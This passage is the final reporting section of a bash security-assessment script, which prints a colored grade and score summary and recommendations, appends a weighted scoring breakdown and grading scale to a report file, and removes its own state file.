echo -e "${CYAN}║${NC}  ╭────────────────────────────────────╮"
echo -e "${CYAN}║${NC}  │  ${WHITE}SECURITY GRADE:${NC} ${COLOR}   $GRADE   ${NC}│"
echo -e "${CYAN}║${NC}  │  ${WHITE}FINAL SCORE:${NC}    ${COLOR}   ${NORMALIZED_SCORE}%  ${NC}│"
echo -e "${CYAN}║${NC}  ╰────────────────────────────────────╯"
echo -e "${CYAN}║${NC}"
echo -e "${CYAN}║${NC}  ${GRAY}$GRADE_DESC${NC}"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}           ${WHITE}RISK DISTRIBUTION${NC}"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}  ${RED}Critical/High (FAIL):${NC}   $FAIL_COUNT tests ($FAIL_PERCENT%)"
echo -e "${CYAN}║${NC}  ${YELLOW}Medium (WARN):${NC}          $WARN_COUNT tests ($WARN_PERCENT%)"
echo -e "${CYAN}║${NC}  ${GREEN}Secure (PASS):${NC}          $PASS_COUNT tests ($PASS_PERCENT%)"
echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Priority recommendations based on results
echo -e "${WHITE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${WHITE}  PRIORITY RECOMMENDATIONS${NC}"
echo -e "${WHITE}═══════════════════════════════════════════════════════════════${NC}"

if [ "$FAIL_COUNT" -gt 0 ]; then
    echo -e "${RED}⚠️  CRITICAL: $FAIL_COUNT security vulnerabilities require IMMEDIATE action!${NC}"
    echo -e "    Review all [FAIL] items in the report and remediate within 24-48 hours."
fi

if [ "$WARN_COUNT" -gt 5 ]; then
    echo -e "${YELLOW}⚡ IMPORTANT: $WARN_COUNT warnings should be reviewed and addressed.${NC}"
    echo -e "    Schedule fixes within the next sprint/release cycle."
fi

if [ "$NORMALIZED_SCORE" -ge 90 ] && [ "$FAIL_COUNT" -eq 0 ]; then
    echo -e "${GREEN}✅ EXCELLENT: Your security posture is strong!${NC}"
    echo -e "   Continue monitoring and keep configurations up to date."
fi

echo ""

# Append comprehensive summary to report
cat >> "$REPORT_FILE" << EOF

════════════════════════════════════════════════════════════════════
                    FINAL SECURITY ASSESSMENT
════════════════════════════════════════════════════════════════════

TEST RESULTS
────────────────────────────────────────────────────────────────────
Total Tests Executed:     $TEST_COUNT
✓ Passed:                 $PASS_COUNT ($PASS_PERCENT%)
! Warnings:               $WARN_COUNT ($WARN_PERCENT%)
✗ Failed:                 $FAIL_COUNT ($FAIL_PERCENT%)

CVSS-STYLE WEIGHTED SCORING
────────────────────────────────────────────────────────────────────
Methodology:
  - PASS items contribute   +1 point each (Secure configuration)
  - WARN items deduct       -1 point each (Medium risk)
  - FAIL items deduct       -3 points each (Critical/High risk)

Calculation:
  Pass Points:              +$WEIGHTED_PASS
  Warn Penalty:             $WEIGHTED_WARN
  Fail Penalty:             $WEIGHTED_FAIL
  ─────────────────────────
  Raw Weighted Score:       $RAW_SCORE
  Normalized Score:         $NORMALIZED_SCORE% (0-100 scale)

FINAL ASSESSMENT
────────────────────────────────────────────────────────────────────
  ┌─────────────────────────────────┐
  │  SECURITY GRADE:    $GRADE              │
  │  FINAL SCORE:       $NORMALIZED_SCORE%             │
  └─────────────────────────────────┘
  
  Assessment: $GRADE_DESC

GRADING SCALE REFERENCE
────────────────────────────────────────────────────────────────────
  A+ (95-100, 0 Failures): Excellent security posture
  A  (90-94):              Very good, minor improvements needed
  B+ (85-89):              Good, some areas need attention
  B  (80-84):              Above average security
  C+ (75-79):              Average, multiple issues to fix
  C  (70-74):              Below average, significant issues
  D  (60-69):              Poor security, many concerns
  F  (<60):                Critical, immediate remediation needed

════════════════════════════════════════════════════════════════════
Report generated: $(date)
Target: $TARGET
════════════════════════════════════════════════════════════════════
EOF

echo -e "Full report saved to: ${BLUE}$REPORT_FILE${NC}"
echo ""

# Cleanup state file on successful completion
if [ -f "$STATE_FILE" ]; then
    rm "$STATE_FILE"
    echo -e "${GREEN}Session completed. State file cleaned up.${NC}"
fi
